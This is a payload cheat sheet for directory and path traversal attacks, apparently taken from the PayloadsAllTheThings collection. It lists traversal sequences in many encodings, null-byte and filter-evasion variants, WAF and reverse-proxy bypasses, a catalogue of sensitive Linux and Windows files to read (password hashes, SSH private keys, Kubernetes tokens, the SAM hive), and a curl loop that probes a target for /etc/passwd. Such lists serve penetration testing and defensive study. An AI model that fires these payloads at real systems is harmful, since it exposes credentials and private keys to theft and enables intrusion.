# Directory / Path Traversal Payloads

> Source: PayloadsAllTheThings — Directory Traversal

## Basic Sequences

```
../
..\
..\/
/..;/         (Tomcat / NGINX bypass)
```

## Encoding Variants

### URL Encoding

```
%2e%2e%2f        = ../
%2e%2e%5c        = ..\
%2e%2e/          = ../
..%2f            = ../
..%5c            = ..\
```

### Double URL Encoding

```
%252e%252e%252f  = ../
%252e%252e%255c  = ..\
```

### Unicode / UTF-8 Encoding

```
%u002e%u002e%u2215   = ../
%c0%ae%c0%ae%c0%af   = ../  (overlong UTF-8)
%c0%2e               = .
%e0%40%ae            = .
%c0%ae               = .
%c0%af               = /
%e0%80%af            = /
```

## Null Byte Injection

```
../../../etc/passwd%00
../../../etc/passwd%00.png
../../../etc/passwd%00.html
.%00./.%00./etc/passwd
```

Works on older PHP (< 5.3.4), older Java, and some other runtimes.

## Traversal Pattern Bypasses

### Double Encoding Bypass

```
..%252f..%252f..%252fetc%252fpasswd
```

### Filter Evasion (Recursive Stripping)

```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\\....\\....\\windows\\win.ini
```

### Redundant Slashes

```
..///////..////..//////etc/passwd
```

### Reverse Proxy Bypass (NGINX + Tomcat)

```
..;/
/..;/..;/etc/passwd
```

### ASP.NET Cookieless Session Bypass

```
/(S(X))/admin/(S(X))/main.aspx
/(A(X)F(Y))/path
```

## OS-Specific Interesting Files

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/issue
/etc/resolv.conf
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/
/proc/self/fd/0
/proc/version
/proc/net/tcp
/var/log/apache2/access.log
/var/log/auth.log
/home/[user]/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.bash_history
/root/.ssh/id_rsa
/root/.bash_history
/run/secrets/kubernetes.io/serviceaccount/token
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\system32\license.rtf
C:\windows\repair\sam
C:\windows\repair\system
C:\inetpub\wwwroot\web.config
C:\inetpub\logs\LogFiles\
C:\xampp\apache\conf\httpd.conf
C:\Users\[user]\.ssh\id_rsa
```

## WAF Bypass Patterns

```
# Mangled double traversal
..././..././
...\.\...\.\

# Path normalization tricks
/etc/./passwd
/etc/../etc/passwd
/etc/passwd/.

# URL encoding + traversal
..%c0%af..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd

# Windows UNC
\\localhost\c$\windows\win.ini
```

## Automated Testing

```bash
# curl-based traversal test
for i in $(seq 1 10); do
  PAYLOAD=$(python3 -c "print('../'*$i + 'etc/passwd')")
  echo "Testing depth $i: $PAYLOAD"
  curl -s "http://target/read?file=$PAYLOAD" | head -1
done
```
